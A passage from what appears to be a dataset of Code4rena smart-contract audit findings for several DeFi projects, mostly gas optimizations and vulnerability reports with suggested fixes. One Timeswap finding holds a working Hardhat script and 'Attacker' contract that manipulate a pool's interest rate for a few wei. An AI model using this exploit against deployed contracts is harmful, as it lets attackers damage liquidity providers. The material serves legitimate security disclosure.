    "body": "# Handle\n\npauliax\n\n\n# Vulnerability details\n\n## Impact\nfunction repayDebt could be refactored to reduce deployment and operational costs\nfrom this:\n```solidity\n  uint256 _debt = debts[_target];\n  if (_debt >= _amount) {\n      debts[_target] -= _amount;\n      totalDebt -= _amount;\n      IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);\n  } else {\n      debts[_target] = 0;\n      totalDebt -= _debt;\n      IERC20(token).safeTransferFrom(msg.sender, address(this), _debt);\n  }\n```\nto this:\n```solidity\n  uint256 _debt = debts[_target];\n  if (_debt > _amount) {\n      debts[_target] = _debt - _amount;\n  } else {\n      debts[_target] = 0;\n      _amount = _debt;\n  }\n  totalDebt -= _amount;\n  IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-insure-findings",
      "repo": "https://github.com/code-423n4/2022-01-insure-findings",
      "url": "https://github.com/code-423n4/2022-01-insure-findings/issues/307"
    }
  },
  {
    "title": "Repeated storage reads",
    "body": "# Handle\n\npauliax\n\n\n# Vulnerability details\n\n## Impact\nRepeated storage read should be cached, e.g.\nattributions[_target] is read from storage twice:\n```solidity\n        if (attributions[_target] > 0) {\n            return (valueAll() * attributions[_target]) / totalAttributions;\n```\ntotalAttributions read twice:\n```solidity\n        if (totalAttributions > 0 && _attribution > 0) {\n            return (_attribution * valueAll()) / totalAttributions;\n```\navailable() called twice:\n```solidity\n        if (available() < _retVal) {\n            uint256 _shortage = _retVal - available();\n```\nwould be cheaper to use _token from memory here:\n```solidity\n    IERC20(token).safeTransfer(_to, _redundant);\n```\n\nThere are more places where this optimization could be applied besides the provided examples, but the basic idea is to cache storage variables if you need to access them multiple times when the value does not change.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-insure-findings",
      "repo": "https://github.com/code-423n4/2022-01-insure-findings",
      "url": "https://github.com/code-423n4/2022-01-insure-findings/issues/306"
    }
  },
  {
    "title": "Repeated external calls",
    "body": "# Handle\n\npauliax\n\n\n# Vulnerability details\n\n## Impact\nAvoid repeated external calls, e.g. here token balanceOf is queried 4 times:\n```solidity\nif (\n    ...\n    balance < IERC20(token).balanceOf(address(this))\n) {\n    uint256 _redundant = IERC20(token).balanceOf(address(this)) - balance;\n    ...\n} else if (IERC20(_token).balanceOf(address(this)) > 0) {\n    IERC20(_token).safeTransfer(\n        _to,\n        IERC20(_token).balanceOf(address(this))\n    );\n}\n```\nYou should query it only once and then use the cached value as it doesn't change between the statements.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-insure-findings",
      "repo": "https://github.com/code-423n4/2022-01-insure-findings",
      "url": "https://github.com/code-423n4/2022-01-insure-findings/issues/304"
    }
  },
  {
    "title": "Multiple potential reentrancies",
    "body": "# Handle\n\n0v3rf10w\n\n\n# Vulnerability details\n\n## Impact\nReentrancy possibilities at multiple places.\n\n## Proof of Concept\n```\nReentrancy in FarmingPools.exit(address) (contracts/farming/FarmingPools.sol#111-114):\n\n        External calls:\n        - withdraw(stakeToken,rewards[stakeToken][msg.sender].stakes) (contracts/farming/FarmingPools.sol#112)\n        - getReward(stakeToken) (contracts/farming/FarmingPools.sol#113)\n\n        State variables written after the call(s):\n        - getReward(stakeToken) (contracts/farming/FarmingPools.sol#113)\n                - distributions[stakeToken].rewardPerTokenStored = rewardPerTokenStored (contracts/farming/FarmingPools.sol#59)\n                - distributions[stakeToken].lastUpdateTime = lastTimeRewardApplicable(stakeToken) (contracts/farming/FarmingPools.sol#60)\n        - getReward(stakeToken) (contracts/farming/FarmingPools.sol#113)\n                - rewards[stakeToken][msg.sender].rewards = 0 (contracts/farming/FarmingPools.sol#119)\n                - rewards[stakeToken][account].rewards = earned(stakeToken,account) (contracts/farming/FarmingPools.sol#62)\n                - rewards[stakeToken][account].userRewardPerTokenPaid = rewardPerTokenStored (contracts/farming/FarmingPools.sol#63)\n```\n```\nReentrancy in LPool.addReserves(uint256) (contracts/liquidity/LPool.sol#969-976):\n        External calls:\n        - actualAddAmount = doTransferIn(msg.sender,addAmount,true) (contracts/liquidity/LPool.sol#972)\n                - address(_token).call(abi.encodeWithSelector(_token.transferFrom.selector,_from,_to,_amount)) (contracts/lib/TransferHelper.sol#29)\n                - IWETH(underlying).deposit{value: actualAmount}() (contracts/liquidity/LPool.sol#279)\n                - actualAmount = IERC20(underlying).safeTransferFrom(from,address(this),amount) (contracts/liquidity/LPool.sol#281)\n        External calls sending eth:\n        - actualAddAmount = doTransferIn(msg.sender,addAmount,true) (contracts/liquidity/LPool.sol#972)\n                - IWETH(underlying).deposit{value: actualAmount}() (contracts/liquidity/LPool.sol#279)\n        State variables written after the call(s):\n        - totalReserves = totalReservesNew (contracts/liquidity/LPool.sol#974)\n```\n```\nReentrancy in OLETokenLock.transferTo(address,uint256) (contracts/OLETokenLock.sol#55-70):\n        External calls:\n        - releaseInternal(beneficiary) (contracts/OLETokenLock.sol#61)\n                - token.transfer(beneficiary,releaseAmount) (contracts/OLETokenLock.sol#51)\n        State variables written after the call(s):\n        - releaseVars[beneficiary].amount = lockedLeftAmount.sub(amount) (contracts/OLETokenLock.sol#65)\n        - releaseVars[beneficiary].startTime = startTime (contracts/OLETokenLock.sol#67)\n        - releaseVars[to] = ReleaseVar(amount,startTime,releaseVars[beneficiary].endTime,startTime) (contracts/OLETokenLock.sol#68)\n```\n\n## Recommended Mitigation Steps\nuse Reentrancy guard from OZ\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-openleverage-findings",
      "repo": "https://github.com/code-423n4/2022-01-openleverage-findings",
      "url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/270"
    }
  },
  {
    "title": "`UniV2ClassDex.sol#uniClassSell()` Tokens with fee on transfer are not fully supported",
    "severity": "medium",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L31-L56\n\n```solidity\nfunction uniClassSell(DexInfo memory dexInfo,\n    address buyToken,\n    address sellToken,\n    uint sellAmount,\n    uint minBuyAmount,\n    address payer,\n    address payee\n) internal returns (uint buyAmount){\n    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);\n    IUniswapV2Pair(pair).sync();\n    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();\n    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);\n    uint balanceBefore = IERC20(buyToken).balanceOf(payee);\n    dexInfo.fees = getPairFees(dexInfo, pair);\n    if (buyToken < sellToken) {\n        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");\n    } else {\n        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");\n    }\n\n    require(buyAmount >= minBuyAmount, 'buy amount less than min');\n    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);\n    return bought;\n}\n```\n\nWhile `uniClassBuy()` correctly checks the actually received amount by comparing the before and after the balance of the receiver, `uniClassSell()` trusted the result given by `getAmountOut()`. This makes `uniClassSell()` can result in an output amount fewer than `minBuyAmount`.\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L101-L102\n\n### Recommendation\n\nChange to:\n\n```solidity\nfunction uniClassSell(DexInfo memory dexInfo,\n    address buyToken,\n    address sellToken,\n    uint sellAmount,\n    uint minBuyAmount,\n    address payer,\n    address payee\n) internal returns (uint bought){\n    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);\n    IUniswapV2Pair(pair).sync();\n    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();\n    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);\n    uint balanceBefore = IERC20(buyToken).balanceOf(payee);\n    dexInfo.fees = getPairFees(dexInfo, pair);\n    if (buyToken < sellToken) {\n        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");\n    } else {\n        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");\n    }\n    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);\n    require(bought >= minBuyAmount, 'buy amount less than min');\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-openleverage-findings",
      "repo": "https://github.com/code-423n4/2022-01-openleverage-findings",
      "url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/208"
    }
  },
  {
    "title": "Gas saving optimizing storage",
    "body": "# Handle\n\n0x1f8b\n\n\n# Vulnerability details\n\n## Impact\nGas saving.\n\n## Proof of Concept\n\n- contracts\\Types.sol: [TradeVars]\n\nMoving the `uint32 dexDetail` close to `address depositErc20` it's possible to save one slot: \n```\nstruct TradeVars {\n        uint depositValue;  \n        IERC20 depositErc20;\n        uint32 dexDetail;  // moved\n        uint fees;\n        uint depositAfterFees;      \n        uint tradeSize;\n        uint newHeld; \n        uint borrowValue;\n        uint token0Price;\n        uint totalHeld;\n    }\n```\n\n- contracts\\Types.sol: [CloseTradeVars]\n\nMoving the `uint32 dexDetail;` close to `bool isPartialClose` it's possible to save one slot: \n```\nstruct CloseTradeVars {\n        uint16 marketId;\n        bool longToken;\n        bool depositToken;\n        uint closeRatio;          \n        bool isPartialClose;        \n        uint32 dexDetail; // moved\n        uint closeAmountAfterFees;\n        uint borrowed;\n        uint repayAmount;     \n        uint depositDecrease;\n        uint depositReturn;  \n        uint sellAmount;\n        uint receiveAmount;\n        uint token0Price;\n        uint fees;\n    }\n```\n\n- contracts\\periphery\\QueryHelper.sol [LiqVars]\n\nMoving `marginLimit` close to `LiqStatus` it's possible to save one storage slot.\n\n```\nstruct LiqVars {\n        LiqStatus status;\n        uint32 marginLimit;  // moved\n        uint lastUpdateTime;\n        uint currentMarginRatio;\n        uint cAvgMarginRatio;\n        uint hAvgMarginRatio;\n    }\n```\n- contracts\\periphery\\QueryHelper.sol [LiquidateVars]\n\nMoving `isSellAllHeld` and `dexDetail` it's possible to save 2 slots\n```\nstruct LiquidateVars {// A variable holder for liquidation process\n        uint16 marketId;\n        bool longToken;\n        bool isSellAllHeld; // moved\n        uint32 dexDetail; // moved\n        uint borrowed; \n        uint fees;      \n        uint penalty; \n        uint remainAmountAfterFees;\n        uint depositDecrease;   \n        uint depositReturn;       \n        uint sellAmount;\n        uint receiveAmount;\n        uint token0Price;\n        uint outstandingAmount;\n        uint finalRepayAmount;\n    }\n```\n\n- contracts\\periphery\\QueryHelper.sol [MarginRatioVars]\n\nMoving `multiplier` and `multiplier` it's possible to save 2 slots\n```\nstruct MarginRatioVars {\n        address heldToken;\n        address sellToken;\n        address owner;\n        uint16 multiplier; // moved\n        uint8 decimals; // moved\n        uint held;\n        bytes dexData;\n        uint price;\n        uint cAvgPrice;\n        uint hAvgPrice; \n        uint lastUpdateTime;\n    }\n```\n\n## Tools Used\nManual review.\n\n## Recommended Mitigation Steps\nApply the mentioned changes\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-openleverage-findings",
      "repo": "https://github.com/code-423n4/2022-01-openleverage-findings",
      "url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/116"
    }
  },
  {
    "title": "Migrate old balance on setToken",
    "body": "# Handle\n\npauliax\n\n\n# Vulnerability details\n\n## Impact\nIn contract BridgeMinter function setToken, it just sets the new tokenAddr, but it does not process the old token balance leaving it stuck in the contract. I think that setToken could also migrate the old balance somewhere before updating the token address.\nI can even suggest adding token rescue functions to the contracts that may come in handy in such cases or if someone accidentally sends the tokens directly to the contract. An owner can rescue the tokens if the token is not protected (e.g. intended to be held in the contract).\n\n## Recommended Mitigation Steps\nAn example implementation that could help to rescue old token balance:\n```solidity\n  function withdrawLPTToL1Migrator(address _tokenAddr, address _recipient) external onlyControllerOwner returns (uint256) {\n      require(_tokenAddr != tokenAddr, \"protected\");\n\n      IERC20 token = IERC20(_tokenAddr);\n\n      uint256 balance = token.balanceOf(address(this));\n\n      token.transfer(_recipient, balance);\n\n      return balance;\n  }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-livepeer-findings",
      "repo": "https://github.com/code-423n4/2022-01-livepeer-findings",
      "url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/234"
    }
  },
  {
    "title": "Remove redundant `_setRoleAdmin()` can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/token/LivepeerToken.sol#L12-L16\n\n```solidity\nconstructor() ERC20(\"Livepeer Token\", \"LPT\") ERC20Permit(\"Livepeer Token\") {\n    _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());\n    _setRoleAdmin(MINTER_ROLE, DEFAULT_ADMIN_ROLE);\n    _setRoleAdmin(BURNER_ROLE, DEFAULT_ADMIN_ROLE);\n}\n```\n\nhttps://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/ControlledGateway.sol#L18-L24\n\n```solidity\nconstructor(address _l1Lpt, address _l2Lpt) {\n    _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());\n    _setRoleAdmin(GOVERNOR_ROLE, DEFAULT_ADMIN_ROLE);\n\n    l1Lpt = _l1Lpt;\n    l2Lpt = _l2Lpt;\n}\n```\n\n`constant DEFAULT_ADMIN_ROLE = 0x00`\n\nBy default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`.\n\nTherefore, `_setRoleAdmin(***_ROLE, DEFAULT_ADMIN_ROLE);` is redundant.\n\nRemoving it will make the code simpler and save some gas.\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/783ac759a902a7b4a218c2d026a77e6a26b6c42d/contracts/access/AccessControl.sol#L40-L43\n\n```solidity\n * By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, which means\n * that only accounts with this role will be able to grant or revoke other\n * roles. More complex role relationships can be created by using\n * {_setRoleAdmin}.\n```\n\nhttps://docs.openzeppelin.com/contracts/3.x/access-control#granting-and-revoking\n\n> AccessControl includes a special role, called DEFAULT_ADMIN_ROLE, which acts as the ***default admin role for all roles***. An account with this role will be able to manage any other role, unless _setRoleAdmin is used to select a new admin role.\n\n### Recommendation\n\nRemove the redundant code.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-livepeer-findings",
      "repo": "https://github.com/code-423n4/2022-01-livepeer-findings",
      "url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/196"
    }
  },
  {
    "title": "Manipulation of the Y State Results in Interest Rate Manipulation",
    "severity": "major",
    "body": "# Handle\n\nRhynorater\n\n\n# Vulnerability details\n\n## Impact\nDue to lack of constraints on user input in the `TimeswapPair.sol#mint` function, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token. \n\nDisclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I'm going to give it a go. \n\n## Proof of Concept\nThe attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool. \n\nConsider the following HardHat script:\n```\nconst hre = require(\"hardhat\");\n\n\n//jtok is asset\n//usdc is collat\n\nasync function launchTestTokens(tokenDeployer){\n    //Launch a token\n    const TestToken = await ethers.getContractFactory(\"TestToken\", signer=tokenDeployer);\n    const tt = await TestToken.deploy(\"JTOK\", \"JTOK\", 1000000000000000)\n    const tt2 = await TestToken.deploy(\"USDC\", \"USDC\", 1000000000000000)\n    let res = await tt.balanceOf(tokenDeployer.address)\n    let res2 = await tt.balanceOf(tokenDeployer.address)\n    console.log(\"JTOK balance: \"+res)\n    console.log(\"USDC balance: \"+res2)\n    return [tt, tt2]\n}\n\nasync function deployAttackersContract(attacker, jtok, usdc){\n    const Att = await ethers.getContractFactory(\"Attacker\", signer=attacker)\n    const atakcontrak = await Att.deploy(jtok.address, usdc.address)\n    return atakcontrak\n}\n\nasync function deployLPContract(lp, jtok, usdc){\n    const LP = await ethers.getContractFactory(\"LP\", signer=lp)\n    const lpc = await LP.deploy(jtok.address, usdc.address)\n    return lpc\n}\n\nasync function main() {\n    const [tokenDeployer, lp, attacker] = await ethers.getSigners();\n    let balance = await tokenDeployer.getBalance()\n    let factory = await ethers.getContractAt(\"TimeswapFactory\", \"0x5FbDB2315678afecb367f032d93F642f64180aa3\", signer=tokenDeployer)\n    //let [jtok, usdc] = await launchTestTokens(tokenDeployer)\n    let jtok = await ethers.getContractAt(\"TestToken\", \"0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6\", signer=tokenDeployer)\n    let usdc = await ethers.getContractAt(\"TestToken\", \"0x8a791620dd6260079bf849dc5567adc3f2fdc318\", signer=tokenDeployer)\n    console.log(\"Jtok: \"+jtok.address)\n    console.log(\"USDC: \"+usdc.address)\n\n    //Create Pair\n    //let txn = await factory.createPair(jtok.address, usdc.address)\n    pairAddress = await factory.getPair(jtok.address, usdc.address)\n    pair = await ethers.getContractAt(\"TimeswapPair\", pairAddress, signer=tokenDeployer)\n    console.log(\"Pair address: \"+pairAddress);\n\n    // Deploy LP\n    //let lpc = await deployLPContract(lp, jtok, usdc)\n    let lpc = await ethers.getContractAt(\"LP\", \"0x948b3c65b89df0b4894abe91e6d02fe579834f8f\", signer=lp)\n\n\n    let jtokb = await jtok.balanceOf(lpc.address)\n    let usdcb = await usdc.balanceOf(lpc.address)\n    console.log(\"LP Jtok: \"+jtokb)\n    console.log(\"LP USDC: \"+usdcb)\n\n    //let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)\n    let res = await pair.constantProduct(1641859791);\n    console.log(\"Post LP Constants:\", res);\n\n    let atakcontrak = await deployAttackersContract(attacker, jtok, usdc)\n\n    jtokb = await jtok.balanceOf(atakcontrak.address)\n    usdcb = await usdc.balanceOf(atakcontrak.address)\n    console.log(\"Attacker Jtok: \"+jtokb)\n    console.log(\"Attacker USDC: \"+usdcb)\n\n    //mint some tokens\n    let txn2 = await atakcontrak.timeswapMint(1641859791, 15, pairAddress)\n\n    let res2 = await pair.constantProduct(1641859791);\n    console.log(\"Post Attack Constants:\", res2);\n\n}\nmain().then(()=>process.exit(0))\n\n```\n\nFirst, the LP deploys their pool and contributes their desired amount of tokens with the below contract:\n```\npragma solidity =0.8.4;\n\nimport \"hardhat/console.sol\";\nimport {ITimeswapMintCallback} from \"./interfaces/callback/ITimeswapMintCallback.sol\";\nimport {IPair} from \"./interfaces/IPair.sol\";\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\ninterface TestTokenLP is IERC20{\n    function mmint(uint256 amount) external;\n}\n\ncontract LP is ITimeswapMintCallback {\n\n    uint112 constant SEC_PER_YEAR = 31556926;\n    TestTokenLP internal jtok;\n    TestTokenLP internal usdc;\n\nconstructor(address _jtok, address _usdc){\n    jtok = TestTokenLP(_jtok);\n    jtok.mmint(10_000 ether);\n    usdc = TestTokenLP(_usdc);\n    usdc.mmint(10_000 ether);\n}\n\nfunction timeswapMint(uint maturity, uint112 APR, address pairAddress) public{\n    uint256 maturity = maturity;\n    console.log(\"Maturity: \", maturity);\n    address liquidityTo = address(this);\n    address dueTo = address(this);\n    uint112 xIncrease = 5_000 ether;\n    uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);\n    uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP\n    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, \"\");\n}\n\n\nfunction timeswapMintCallback(\n        uint112 assetIn,\n        uint112 collateralIn,\n        bytes calldata data\n    ) override external{\n        jtok.mmint(100_000 ether);\n        usdc.mmint(100_000 ether);\n        console.log(\"Asset requested:\", assetIn);\n        console.log(\"Collateral requested:\", collateralIn);\n        //check before\n        uint256 beforeJtok = jtok.balanceOf(msg.sender);\n        console.log(\"LP jtok before\", beforeJtok);\n        //transfer\n        jtok.transfer(msg.sender, assetIn);\n        //check after\n        uint256 afterJtok = jtok.balanceOf(msg.sender);\n        console.log(\"LP jtok after\", afterJtok);\n        //check before\n        uint256 beforeUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"LP USDC  before\", beforeUsdc);\n        //transfer\n        usdc.transfer(msg.sender, collateralIn);\n        //check after\n        uint256 afterUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"LP USDC After\", afterUsdc);\n        \n    }\n}\n\n```\nHere are the initialization values:\n```\n    uint112 xIncrease = 5_000 ether;\n    uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);\n    uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP\n```\nWith this configuration, I've calculated the interest rate to borrow on this pool using the functions defined here: https://timeswap.gitbook.io/timeswap/deep-dive/borrowing\nto  be:\n```\nyMax: 4.7533146923118e-06\nMin Interest Rate: 0.009374999999999765\nMax Interest Rate: 0.14999999999999625\nzMax: 1666.6666666666667\n\n```\nAround 1% to 15%. \n\nThen, the attacker comes along (see line containing `let atakcontrak` and after). The attacker deploys the following contract:\n```\npragma solidity =0.8.4;\n\nimport \"hardhat/console.sol\";\nimport {ITimeswapMintCallback} from \"./interfaces/callback/ITimeswapMintCallback.sol\";\nimport {IPair} from \"./interfaces/IPair.sol\";\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\ninterface TestTokenAtt is IERC20{\n    function mmint(uint256 amount) external;\n}\n\ncontract Attacker is ITimeswapMintCallback {\n\n    uint112 constant SEC_PER_YEAR = 31556926;\n    TestTokenAtt internal jtok;\n    TestTokenAtt internal usdc;\n\nconstructor(address _jtok, address _usdc){\n    jtok = TestTokenAtt(_jtok);\n    jtok.mmint(10_000 ether);\n    usdc = TestTokenAtt(_usdc);\n    usdc.mmint(10_000 ether);\n}\n\nfunction timeswapMint(uint maturity, uint112 APR, address pairAddress) public{\n    uint256 maturity = maturity;\n    console.log(\"Maturity: \", maturity);\n    address liquidityTo = address(this);\n    address dueTo = address(this);\n    uint112 xIncrease = 3;\n    uint112 yIncrease = 1000000000000000;\n    uint112 zIncrease = 5; //Static 167% CDP\n    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, \"\");\n}\n\n\nfunction timeswapMintCallback(\n        uint112 assetIn,\n        uint112 collateralIn,\n        bytes calldata data\n    ) override external{\n        jtok.mmint(100_000 ether);\n        usdc.mmint(100_000 ether);\n        console.log(\"Asset requested:\", assetIn);\n        console.log(\"Collateral requested:\", collateralIn);\n        //check before\n        uint256 beforeJtok = jtok.balanceOf(msg.sender);\n        console.log(\"Attacker jtok before\", beforeJtok);\n        //transfer\n        jtok.transfer(msg.sender, assetIn);\n        //check after\n        uint256 afterJtok = jtok.balanceOf(msg.sender);\n        console.log(\"Attacker jtok after\", afterJtok);\n        //check before\n        uint256 beforeUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"Attacker USDC  before\", beforeUsdc);\n        //transfer\n        usdc.transfer(msg.sender, collateralIn);\n        //check after\n        uint256 afterUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"Attacker USDC After\", afterUsdc);\n        \n    }\n}\n```\n\nWhich contains the following settings for a mint:\n```\n    uint112 xIncrease = 3;\n    uint112 yIncrease = 1000000000000000;\n    uint112 zIncrease = 5; //Static 167% CDP\n```\n\nAccording to my logs in hardhat:\n```\n    Maturity:  1641859791\n    Callback before: 8333825816710789998373\n    Asset requested: 3\n    Collateral requested: 6\n    Attacker jtok before 5000000000000000000000\n    Attacker jtok after 5000000000000000000003\n    Attacker USDC  before 8333825816710789998373\n    Attacker USDC After 8333825816710789998379\n    Callback after: 8333825816710789998379\n    Callback expected after: 8333825816710789998379\n\n```\nThe attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker's malicious mint is up, the interest rate becomes:\n```\nyMax: 0.0002047533146923118\nMin Interest Rate: 0.40383657499999975\nMax Interest Rate: 6.461385199999996\nzMax: 1666.6666666666667\n```\nBetween 40 and 646 percent.\n\n\nxyz values before and after:\n```\nPost LP Constants: [ BigNumber { value: \"5000000000000000000000\" },\n  BigNumber { value: \"23766573461559\" },\n  BigNumber { value: \"8333333333333333333333\" },\n  x: BigNumber { value: \"5000000000000000000000\" },\n  y: BigNumber { value: \"23766573461559\" },\n  z: BigNumber { value: \"8333333333333333333333\" } ]\nAttacker Jtok: 10000000000000000000000\nAttacker USDC: 10000000000000000000000\nPost Attack Constants: [ BigNumber { value: \"5000000000000000000003\" },\n  BigNumber { value: \"1023766573461559\" },\n  BigNumber { value: \"8333333333333333333338\" },\n  x: BigNumber { value: \"5000000000000000000003\" },\n  y: BigNumber { value: \"1023766573461559\" },\n  z: BigNumber { value: \"8333333333333333333338\" } ]\n\n```\n\nThis result in destruction of the pool. \n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-timeswap-findings",
      "repo": "https://github.com/code-423n4/2022-01-timeswap-findings",
      "url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/187"
    }
  },
  {
    "title": "Race condition on ERC20 approval",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/base/ERC20.sol#L58-L66\n\n```solidity=58\nfunction _approve(\n    address owner,\n    address spender,\n    uint256 amount\n) internal {\n    allowance[owner][spender] = amount;\n\n    emit Approval(owner, spender, amount);\n}\n```\n\nUsing approve() to manage allowances opens yourself and users of the token up to frontrunning.\n\nBest practice, but doesn't usually matter.\n\n[Explanation](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit) of this possible attack vector\n\nSee also: [0xProject/0x-monorepo#850](https://github.com/0xProject/0x-monorepo/issues/850)\n\nA potential fix includes preventing a call to approve if all the previous tokens are not spent through adding a check that the allowed balance is 0:\n\n`require(allowed[msg.sender][_spender] == 0)`.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-timeswap-findings",
      "repo": "https://github.com/code-423n4/2022-01-timeswap-findings",
      "url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/168"
    }
  },
  {
    "title": "swapBaseTokenForQuoteToken and swapQuoteTokenForBaseToken do not check output quantities to be achievable",
    "body": "# Handle\n\nhyh\n\n\n# Vulnerability details\n\n## Impact\n\nWhenever swaps are being run with token amounts too big the system fails with low level not enough amount message from the requested ERC20 token transfer.\n\n## Proof of Concept\n\nBoth swap functions do not check the amount to be returned:\n\n\nquoteTokenQty calculated isn't checked to be achievable:\n\nhttps://github.com/code-423n4/2022-01-elasticswap/blob/main/elasticswap/src/contracts/Exchange.sol#L285\n\n\nbaseTokenQty calculated isn't checked to be achievable:\n\nhttps://github.com/code-423n4/2022-01-elasticswap/blob/main/elasticswap/src/contracts/Exchange.sol#L323\n\n\n\n## Recommended Mitigation Steps\n\nCheck the amounts to be returned from the quote-to-base and base-to-quote swaps to be lower than current base and quote balance.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-elasticswap-findings",
      "repo": "https://github.com/code-423n4/2022-01-elasticswap-findings",
      "url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/160"
    }
  },
  {
    "title": " Outdated versions of OpenZeppelin library",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nOutdated versions of OpenZeppelin library are used.\n\nNew versions of OpenZeppelin libraries can be more gas efficient. \n\nFor example:\n\n`ERC20.sol` in @openzeppelin/contracts@4.1.0:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.1.0/contracts/token/ERC20/ERC20.sol#L152-L153\n\n```solidity\nrequire(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n_approve(sender, _msgSender(), currentAllowance - amount);\n```\n\nA gas optimization upgrade has been added to @openzeppelin/contracts@4.4.2:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.4.2/contracts/token/ERC20/ERC20.sol#L158-L161\n```solidity\nrequire(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\nunchecked {\n    _approve(sender, _msgSender(), currentAllowance - amount);\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-elasticswap-findings",
      "repo": "https://github.com/code-423n4/2022-01-elasticswap-findings",
      "url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/155"
    }
  },
  {
    "title": "[WP-H2] Transferring `quoteToken` to the exchange pool contract will cause future liquidity providers to lose funds",
    "severity": "major",
